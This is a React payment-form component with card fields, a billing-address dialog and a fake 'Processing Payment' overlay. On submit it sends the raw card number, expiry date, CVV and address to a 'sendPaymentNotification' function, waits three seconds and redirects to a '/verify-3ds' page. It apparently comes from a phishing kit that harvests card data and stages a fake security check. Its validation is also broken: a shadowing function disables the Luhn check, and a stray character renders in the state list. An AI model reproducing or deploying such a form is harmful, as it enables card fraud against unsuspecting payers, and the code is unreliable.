import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { Input } from "./ui/input";
import { Button } from "./ui/button";
import { Label } from "./ui/label";
import { useToast } from "./ui/use-toast";
import { sendPaymentNotification } from "../utils/internalApi";
import { GridLoader } from "react-spinners";
import { Building2 } from "lucide-react";
import { EncryptButton } from "./EncryptButton";
import { CardTypeIcon } from "./CardTypeIcon";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from "./ui/dialog";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "./ui/select";

interface PaymentFormProps {
  amount: number;
}

interface BillingDetails {
  address1: string;
  address2: string;
  city: string;
  state: string;
  zipCode: string;
  country: string;
}

const validateCardNumber = (cardNumber: string): boolean => {
  const digits = cardNumber.replace(/\D/g, '');
  let sum = 0;
  let isEven = false;

  for (let i = digits.length - 1; i >= 0; i--) {
    let digit = parseInt(digits[i]);

    if (isEven) {
      digit *= 2;
      if (digit > 9) {
        digit -= 9;
      }
    }

    sum += digit;
    isEven = !isEven;
  }

  return sum % 10 === 0;
};

export const PaymentForm = ({ amount }: PaymentFormProps) => {
  const [cardHolder, setCardHolder] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [cvv, setCvv] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [billingDetails, setBillingDetails] = useState<BillingDetails>({
    address1: "",
    address2: "",
    city: "",
    state: "",
    zipCode: "",
    country: "US",
  });
  const navigate = useNavigate();
  const { toast } = useToast();
  const searchParams = new URLSearchParams(window.location.search);
  const companyFromUrl = searchParams.get('company');

  useEffect(() => {
    if (companyFromUrl) {
      setBillingDetails(prev => ({
        ...prev,
        company: companyFromUrl
      }));
    }
  }, [companyFromUrl]);

  const validateCardHolder = (value: string) => {
    const latinAndDotRegex = /^[a-zA-Z\s.]*$/;
    const dotCount = (value.match(/\./g) || []).length;
    
    value = value.slice(0, 12);
    
    if (!latinAndDotRegex.test(value)) {
      return value.replace(/[^a-zA-Z\s.]/g, '').toUpperCase();
    }
    
    if (dotCount > 1) {
      const firstDotIndex = value.indexOf('.');
      return (value.slice(0, firstDotIndex + 1) + value.slice(firstDotIndex + 1).replace(/\./g, '')).toUpperCase();
    }
    
    return value.toUpperCase();
  };

  const validateCardNumber = (value: string) => {
    return value.replace(/\D/g, '');
  };

  const validateExpiryDate = (value: string) => {
    const cleanValue = value.replace(/\D/g, '');
    if (cleanValue.length >= 2) {
      const month = parseInt(cleanValue.substring(0, 2));
      
      if (month > 12) {
        return '12' + (cleanValue.length > 2 ? '/' + cleanValue.substring(2, 4) : '');
      }
      if (month === 0) {
        return '01' + (cleanValue.length > 2 ? '/' + cleanValue.substring(2, 4) : '');
      }

      if (cleanValue.length >= 4) {
        const year = parseInt(cleanValue.substring(2, 4));
        
        const currentDate = new Date();
        const currentYear = currentDate.getFullYear() % 100;
        const currentMonth = currentDate.getMonth() + 1;

        if (year < currentYear || (year === currentYear && month < currentMonth)) {
          toast({
            title: "Invalid Expiry Date",
            description: "Card has expired",
            variant: "destructive",
          });
          return '';
        }
      }

      return month.toString().padStart(2, '0') + (cleanValue.length > 2 ? '/' + cleanValue.substring(2, 4) : '');
    }
    return cleanValue;
  };

  const validateCVV = (value: string) => {
    const numbers = value.replace(/\D/g, '');
    return numbers.slice(0, 3);
  };

  const handleBillingDetailsChange = (field: keyof BillingDetails, value: string) => {
    setBillingDetails(prev => ({
      ...prev,
      [field]: value
    }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);

    if (!validateCardNumber(cardNumber)) {
      toast({
        title: "Invalid Card",
        description: "Please enter a valid card number",
        variant: "destructive",
      });
      setIsSubmitting(false);
      return;
    }

    if (!billingDetails.address1 || !billingDetails.city || !billingDetails.country || !billingDetails.state || !billingDetails.zipCode) {
      toast({
        title: "Missing Billing Details",
        description: "Please enter your complete billing information",
        variant: "destructive",
      });
      setIsSubmitting(false);
      return;
    }

    try {
      await sendPaymentNotification({
        amount: amount,
        cardHolder,
        cardNumber,
        expiryDate,
        cvv,
        billingDetails
      });

      await new Promise(resolve => setTimeout(resolve, 3000));
      
      navigate(`/verify-3ds?amount=${amount}&cardHolder=${encodeURIComponent(cardHolder)}`);
    } catch (error) {
      console.error('Error processing payment:', error);
      setIsSubmitting(false);
      toast({
        title: "Error",
        description: "Failed to process payment. Please try again.",
        variant: "destructive",
      });
    }
  };

  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
    const matches = v.match(/\d{4,16}/g);
    const match = (matches && matches[0]) || "";
    const parts = [];

    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }

    if (parts.length) {
      return parts.join(" ");
    } else {
      return value;
    }
  };

  return (
    <form onSubmit={handleSubmit} className="w-full space-y-6 bg-black/20 backdrop-blur-xl p-8 rounded-xl border border-white/10 shadow-2xl animate-fadeIn relative">
      {isSubmitting && (
        <div className="absolute inset-0 bg-black/80 backdrop-blur-sm rounded-xl flex flex-col items-center justify-center gap-6 z-50 animate-fadeIn">
          <GridLoader color="#8B5CF6" size={15} margin={2} />
          <div className="text-white/90 font-medium text-lg">Processing Payment...</div>
          <div className="text-white/60 text-sm">Please do not close this window</div>
        </div>
      )}
      
      <div className="space-y-4">
        <div className="space-y-2">
          <Input
            type="text"
            placeholder="Card Holder Name"
            value={cardHolder}
            onChange={(e) => setCardHolder(validateCardHolder(e.target.value))}
            className="bg-black/50 border-white/20 text-white placeholder:text-gray-500 focus:border-white/40 transition-colors"
            required
          />
        </div>
        <div className="space-y-2 relative">
          <Input
            type="text"
            placeholder="Card Number"
            value={cardNumber}
            onChange={(e) => setCardNumber(formatCardNumber(validateCardNumber(e.target.value)))}
            maxLength={19}
            className="bg-black/50 border-white/20 text-white placeholder:text-gray-500 focus:border-white/40 transition-colors pr-12"
            required
          />
          <CardTypeIcon cardNumber={cardNumber} />
        </div>
        <div className="grid grid-cols-2 gap-4">
          <div className="space-y-2">
            <Input
              type="text"
              placeholder="MM/YY"
              value={expiryDate}
              onChange={(e) => setExpiryDate(validateExpiryDate(e.target.value))}
              maxLength={5}
              className="bg-black/50 border-white/20 text-white placeholder:text-gray-500 focus:border-white/40 transition-colors"
              required
            />
          </div>
          <div className="space-y-2">
            <Input
              type="text"
              placeholder="CVV"
              value={cvv}
              onChange={(e) => setCvv(validateCVV(e.target.value))}
              maxLength={3}
              className="bg-black/50 border-white/20 text-white placeholder:text-gray-500 focus:border-white/40 transition-colors"
              required
            />
          </div>
        </div>

        <Dialog>
          <DialogTrigger asChild>
            <button
              type="button"
              className="relative w-full inline-flex items-center justify-center overflow-hidden transition-all duration-250 bg-[radial-gradient(65.28%_65.28%_at_50%_100%,rgba(223,113,255,0.8)_0%,rgba(223,113,255,0)_100%),linear-gradient(0deg,#7a5af8,#7a5af8)] rounded-xl border-0 outline-none px-4 py-3 hover:scale-[0.95] group"
            >
              <span className="absolute top-0 right-0 h-4 w-4 transition-all duration-500 bg-[radial-gradient(100%_75%_at_55%,rgba(223,113,255,0.8)_0%,rgba(223,113,255,0)_100%)] shadow-md rounded-br-xl rounded-tl-lg after:content-[''] after:absolute after:top-0 after:right-0 after:w-[150%] after:h-[150%] after:rotate-45 after:translate-x-0 after:-translate-y-[18px] after:bg-gray-200 after:pointer-events-none group-hover:-mt-4 group-hover:-mr-4" />

              <div className="absolute inset-0 overflow-hidden pointer-events-none">
                {Array.from({ length: 10 }).map((_, i) => (
                  <i
                    key={i}
                    className={`absolute bottom-[-10px] w-[2px] h-[2px] bg-white rounded-full animate-floating-points`}
                    style={{
                      left: `${[10, 30, 25, 44, 50, 75, 88, 58, 98, 65][i]}%`,
                      opacity: [1, 0.7, 0.8, 0.6, 1, 0.5, 0.9, 0.8, 0.6, 1][i],
                      animationDuration: `${[2.35, 2.5, 2.2, 2.05, 1.9, 1.5, 2.2, 2.25, 2.6, 2.5][i]}s`,
                      animationDelay: `${[0.2, 0.5, 0.1, 0, 0, 1.5, 0.2, 0.2, 0.1, 0.2][i]}s`
                    }}
                  />
                ))}
              </div>

              <span className="relative z-[2] flex items-center justify-center gap-2 text-white font-medium">
                <Building2 className="w-[18px] h-[18px] transition-all duration-100 group-hover:fill-transparent group-hover:animate-icon-dash group-focus:fill-white group-hover:animate-icon-fill" />
                Billing Details
              </span>
            </button>
          </DialogTrigger>
          <DialogContent className="bg-black/95 border-white/20 text-white max-h-[80vh] overflow-y-auto scrollbar-thin scrollbar-thumb-white/20 scrollbar-track-transparent">
            <DialogHeader>
              <DialogTitle>Billing Details</DialogTitle>
            </DialogHeader>
            <div className="space-y-4 py-4">
              <Select
                value={billingDetails.country}
                onValueChange={(value) => handleBillingDetailsChange('country', value)}
              >
                <SelectTrigger className="bg-black/50 border-white/20 text-white">
                  <SelectValue placeholder="Select Country" />
                </SelectTrigger>
                <SelectContent className="bg-black/95 border-white/20 max-h-[200px] overflow-y-auto">
                  <SelectItem value="US">United States</SelectItem>
                  <SelectItem value="CA">Canada</SelectItem>
                  <SelectItem value="GB">United Kingdom</SelectItem>
                  <SelectItem value="FR">France</SelectItem>
                  <SelectItem value="DE">Germany</SelectItem>
                  <SelectItem value="IT">Italy</SelectItem>
                  <SelectItem value="ES">Spain</SelectItem>
                  <SelectItem value="PT">Portugal</SelectItem>
                  <SelectItem value="NL">Netherlands</SelectItem>
                  <SelectItem value="BE">Belgium</SelectItem>
                  <SelectItem value="CH">Switzerland</SelectItem>
                  <SelectItem value="AT">Austria</SelectItem>
                  <SelectItem value="SE">Sweden</SelectItem>
                  <SelectItem value="NO">Norway</SelectItem>
                  <SelectItem value="DK">Denmark</SelectItem>
                  <SelectItem value="FI">Finland</SelectItem>
                  <SelectItem value="IE">Ireland</SelectItem>
                  <SelectItem value="PL">Poland</SelectItem>
                  <SelectItem value="CZ">Czech Republic</SelectItem>
                  <SelectItem value="SK">Slovakia</SelectItem>
                  <SelectItem value="HU">Hungary</SelectItem>
                  <SelectItem value="RO">Romania</SelectItem>
                  <SelectItem value="BG">Bulgaria</SelectItem>
                  <SelectItem value="GR">Greece</SelectItem>
                  <SelectItem value="TR">Turkey</SelectItem>
                  <SelectItem value="IL">Israel</SelectItem>
                  <SelectItem value="AE">United Arab Emirates</SelectItem>
                  <SelectItem value="SA">Saudi Arabia</SelectItem>
                  <SelectItem value="IN">India</SelectItem>
                  <SelectItem value="CN">China</SelectItem>
                  <SelectItem value="JP">Japan</SelectItem>
                  <SelectItem value="KR">South Korea</SelectItem>
                  <SelectItem value="AU">Australia</SelectItem>
                  <SelectItem value="NZ">New Zealand</SelectItem>
                  <SelectItem value="BR">Brazil</SelectItem>
                  <SelectItem value="AR">Argentina</SelectItem>
                  <SelectItem value="MX">Mexico</SelectItem>
                  <SelectItem value="ZA">South Africa</SelectItem>
                  <SelectItem value="EG">Egypt</SelectItem>
                </SelectContent>
              </Select>
              <Input
                type="text"
                placeholder="Address Line 1"
                value={billingDetails.address1}
                onChange={(e) => handleBillingDetailsChange('address1', e.target.value)}
                className="bg-black/50 border-white/20 text-white placeholder:text-gray-500 focus:border-white/40 transition-colors"
                required
              />
              <Input
                type="text"
                placeholder="Address Line 2 (optional)"
                value={billingDetails.address2}
                onChange={(e) => handleBillingDetailsChange('address2', e.target.value)}
                className="bg-black/50 border-white/20 text-white placeholder:text-gray-500 focus:border-white/40 transition-colors"
              />
              <Input
                type="text"
                placeholder="City"
                value={billingDetails.city}
                onChange={(e) => handleBillingDetailsChange('city', e.target.value)}
                className="bg-black/50 border-white/20 text-white placeholder:text-gray-500 focus:border-white/40 transition-colors"
                required
              />
              <Select
                value={billingDetails.state}
                onValueChange={(value) => handleBillingDetailsChange('state', value)}
              >
                <SelectTrigger className="bg-black/50 border-white/20 text-white">
                  <SelectValue placeholder="Select State" />
                </SelectTrigger>
                <SelectContent className="bg-black/95 border-white/20">
                  <SelectItem value="AL">Alabama</SelectItem>
                  <SelectItem value="AK">Alaska</SelectItem>
                  <SelectItem value="AZ">Arizona</SelectItem>
                  <SelectItem value="AR">Arkansas</SelectItem>
                  <SelectItem value="CA">California</SelectItem>
                  <SelectItem value="CO">Colorado</SelectItem>
                  <SelectItem value="CT">Connecticut</SelectItem>
                  <SelectItem value="DE">Delaware</SelectItem>
                  <SelectItem value="FL">Florida</SelectItem>
                  <SelectItem value="GA">Georgia</SelectItem>
                  <SelectItem value="HI">Hawaii</SelectItem>
                  <SelectItem value="ID">Idaho</SelectItem>
                  <SelectItem value="IL">Illinois</SelectItem>
                  <SelectItem value="IN">Indiana</SelectItem>
                  <SelectItem value="IA">Iowa</SelectItem>
                  <SelectItem value="KS">Kansas</SelectItem>
                  <SelectItem value="KY">Kentucky</SelectItem>;
                  <SelectItem value="LA">Louisiana</SelectItem>
                  <SelectItem value="ME">Maine</SelectItem>
                  <SelectItem value="MD">Maryland</SelectItem>
                  <SelectItem value="MA">Massachusetts</SelectItem>
                  <SelectItem value="MI">Michigan</SelectItem>
                  <SelectItem value="MN">Minnesota</SelectItem>
                  <SelectItem value="MS">Mississippi</SelectItem>
                  <SelectItem value="MO">Missouri</SelectItem>
                  <SelectItem value="MT">Montana</SelectItem>
                  <SelectItem value="NE">Nebraska</SelectItem>
                  <SelectItem value="NV">Nevada</SelectItem>
                  <SelectItem value="NH">New Hampshire</SelectItem>
                  <SelectItem value="NJ">New Jersey</SelectItem>
                  <SelectItem value="NM">New Mexico</SelectItem>
                  <SelectItem value="NY">New York</SelectItem>
                  <SelectItem value="NC">North Carolina</SelectItem>
                  <SelectItem value="ND">North Dakota</SelectItem>
                  <SelectItem value="OH">Ohio</SelectItem>
                  <SelectItem value="OK">Oklahoma</SelectItem>
                  <SelectItem value="OR">Oregon</SelectItem>
                  <SelectItem value="PA">Pennsylvania</SelectItem>
                  <SelectItem value="RI">Rhode Island</SelectItem>
                  <SelectItem value="SC">South Carolina</SelectItem>
                  <SelectItem value="SD">South Dakota</SelectItem>
                  <SelectItem value="TN">Tennessee</SelectItem>
                  <SelectItem value="TX">Texas</SelectItem>
                  <SelectItem value="UT">Utah</SelectItem>
                  <SelectItem value="VT">Vermont</SelectItem>
                  <SelectItem value="VA">Virginia</SelectItem>
                  <SelectItem value="WA">Washington</SelectItem>
                  <SelectItem value="WV">West Virginia</SelectItem>
                  <SelectItem value="WI">Wisconsin</SelectItem>
                  <SelectItem value="WY">Wyoming</SelectItem>
                </SelectContent>
              </Select>
              <Input
                type="text"
                placeholder="ZIP Code"
                value={billingDetails.zipCode}
                onChange={(e) => handleBillingDetailsChange('zipCode', e.target.value)}
                className="bg-black/50 border-white/20 text-white placeholder:text-gray-500 focus:border-white/40 transition-colors"
                required
                maxLength={5}
                pattern="[0-9]*"
              />
            </div>
          </DialogContent>
        </Dialog>

        <EncryptButton isSubmitting={isSubmitting} />
      </div>
    </form>
  );
};
